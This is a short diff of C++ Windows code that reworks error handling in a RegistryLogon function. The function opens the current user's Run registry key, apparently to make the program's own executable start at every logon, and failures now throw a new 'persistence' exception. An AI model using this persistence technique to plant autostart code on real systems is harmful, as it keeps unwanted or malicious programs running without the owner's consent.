@@ -9,7 +9,7 @@ void getProcessExe(LPSTR path, SIZE_T size) {
     GetModuleFileNameA(NULL, path, size);
 }
 
-int RegistryLogon(LPCSTR path, SIZE_T pathLength) {
+void RegistryLogon(LPCSTR path, SIZE_T pathLength) {
     std::cout << path << "\n";
     try {
         HKEY key = createKey(HKEY_CURRENT_USER, RUN_KEY, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, NULL);
@@ -20,8 +20,11 @@ int RegistryLogon(LPCSTR path, SIZE_T pathLength) {
 
     } catch (const RegistryException& error) {
         std::cerr << "Error: " << error.funcName << "status code: " << error.status << "\n";
-        return 1;
+        throw PresistenceException(1, "RegistryLogon");
     }
+}
 
-    return 0;
+
+PresistenceException::PresistenceException(int status, std::string funcName) : Exception(status, funcName) {
+    // intatinly empty
 }
